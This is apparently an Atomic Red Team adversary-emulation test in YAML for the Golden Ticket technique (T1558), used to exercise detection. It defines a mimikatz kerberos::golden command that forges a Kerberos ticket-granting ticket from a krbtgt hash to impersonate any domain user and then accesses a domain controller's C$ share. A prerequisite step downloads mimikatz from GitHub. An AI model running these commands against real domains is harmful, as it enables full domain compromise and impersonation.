---
attack_technique: T1558
display_name: Golden Ticket

atomic_tests:
- name: Crafting golden tickets with mimikatz
  description: |
    Once the hash of the special krbtgt user is retrieved it is possible to craft ticket granting ticket imporsonating any user in the domain. this test craft a golden ticket and then perform a request with it.

  supported_platforms:
    - windows


  input_arguments:
    output_file:
      description: mimikatz output file
      type: path
      default: PathToTest\bin\Mimikatz\x64\mimikatz.log
    domain_sid:
      description: Sid of the targeted domain
      type: string
      default: Sid
    domain:
      description: Targeted domain
      type: string
      default: example.com
    account:
      description: Account to impersonate
      type: string
      default: Attacker1
    krbtgt_hash:
      description: Krbtgt hash
      type: string
      default: hash
    machine:
      description: machine to target with crafted golden ticket
      type: string
      default: DC1
    mimikatz_path:
      description: mimikatz windows executable
      type: path
      default: PathToTest\\bin\Mimikatz\x64\mimikatz.exe

  dependencies:
  - description: |
      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
    prereq_command: |
      $mimikatz_path = cmd /c echo #{mimikatz_path}
      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
    get_prereq_command: |
      $mimikatz_path = cmd /c echo #{mimikatz_path}
      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force

  executor:
    name: command_prompt
    elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
    command: | # these are the actaul attack commands, at least one command must be provided
      klist purge
      #{mimikatz_path} "log #{output_file}" "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_hash} /user:#{account} /ptt" "exit" > $null
      pushd \\#{machine}\C$
      net use /delete * /y
      klist purge
    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
      'rm #{output_file}'